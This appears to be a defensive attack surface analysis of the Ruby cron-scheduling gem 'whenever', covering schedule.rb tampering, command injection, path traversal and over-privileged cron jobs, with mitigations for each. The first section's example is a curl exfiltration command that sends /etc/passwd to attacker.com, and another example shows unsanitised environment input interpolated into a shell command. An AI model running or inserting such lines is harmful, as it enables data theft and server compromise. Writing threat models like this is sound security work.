# Attack Surface Analysis for javan/whenever

## Attack Surface: [Malicious `schedule.rb` Modification](./attack_surfaces/malicious__schedule_rb__modification.md)

**Description:** An attacker gains write access to the `schedule.rb` file and modifies it to include malicious commands.

**How Whenever Contributes:** `whenever` relies on the `schedule.rb` file as the source of truth for defining cron jobs. It parses this file and translates it into cron syntax. If this file is compromised, `whenever` will faithfully schedule the malicious commands.

**Example:** An attacker modifies `schedule.rb` to include: `every 1.day, at: 'midnight' do command "curl http://attacker.com/steal_data -d $(cat /etc/passwd)" end`

**Impact:** Full system compromise, data exfiltration, denial of service, privilege escalation (depending on the user running cron).

**Risk Severity:** Critical

**Mitigation Strategies:**
* Implement strict file system permissions on the `schedule.rb` file, ensuring only authorized users and processes have write access.
* Store `schedule.rb` in a read-only location during deployment.
* Utilize version control for `schedule.rb` and monitor changes.
* Implement code review processes for changes to `schedule.rb`.

## Attack Surface: [Command Injection via Unsafe Command Construction in `schedule.rb`](./attack_surfaces/command_injection_via_unsafe_command_construction_in__schedule_rb_.md)

**Description:** Developers construct commands within `schedule.rb` using string interpolation or concatenation with external data or user input without proper sanitization.

**How Whenever Contributes:** `whenever` executes the commands defined in `schedule.rb`. If these commands are constructed unsafely, it will pass the vulnerable command to the shell for execution.

**Example:** `variable = ENV['UNTRUSTED_INPUT']; every 1.day do command "process_data.sh #{variable}" end` If `UNTRUSTED_INPUT` contains malicious shell commands, they will be executed.

**Impact:** Arbitrary command execution on the server with the privileges of the cron job's user.

**Risk Severity:** Critical

**Mitigation Strategies:**
* Avoid constructing commands dynamically using unsanitized input.
* Prefer using parameterized commands or explicitly defined, safe commands.
* If dynamic command construction is absolutely necessary, rigorously sanitize and validate all external data using appropriate escaping or sanitization libraries.
* Consider using dedicated libraries for interacting with the operating system that offer safer command execution methods.

## Attack Surface: [Path Traversal in `schedule.rb`](./attack_surfaces/path_traversal_in__schedule_rb_.md)

**Description:** The `schedule.rb` file uses paths to scripts or executables without proper validation, allowing an attacker to manipulate these paths to point to malicious scripts outside the intended directories.

**How Whenever Contributes:** `whenever` uses the provided paths to execute the specified scripts or commands. If these paths are not validated, it will execute whatever is at the given path.

**Example:** `every 1.day do runner "../../../tmp/malicious_script.sh" end`

**Impact:** Execution of arbitrary code, potentially with elevated privileges depending on the cron job's user.

**Risk Severity:** High

**Mitigation Strategies:**
* Use absolute paths for all scripts and executables referenced in `schedule.rb`.
* Avoid relying on relative paths or user-provided paths.
* Implement checks to ensure paths point to expected locations within the application's directory structure.

## Attack Surface: [Cron Job Execution with Excessive Privileges](./attack_surfaces/cron_job_execution_with_excessive_privileges.md)

**Description:** The cron jobs defined by `whenever` are executed by the system's cron daemon. If the user running these cron jobs has excessive privileges, vulnerabilities in the scheduled tasks can lead to privilege escalation.

**How Whenever Contributes:** `whenever` manages the scheduling of these jobs. While it doesn't directly control the user running the jobs, it facilitates the execution of tasks within that user's context.

**Example:** A cron job running as root with a command injection vulnerability could allow an attacker to execute commands as root.

**Impact:** Gaining higher privileges on the system.

**Risk Severity:** High

**Mitigation Strategies:**
* Run cron jobs with the least necessary privileges.
* Avoid running cron jobs as root unless absolutely required.
* Implement proper user and group management for cron jobs.
* Apply the principle of least privilege to the user account running the cron jobs.

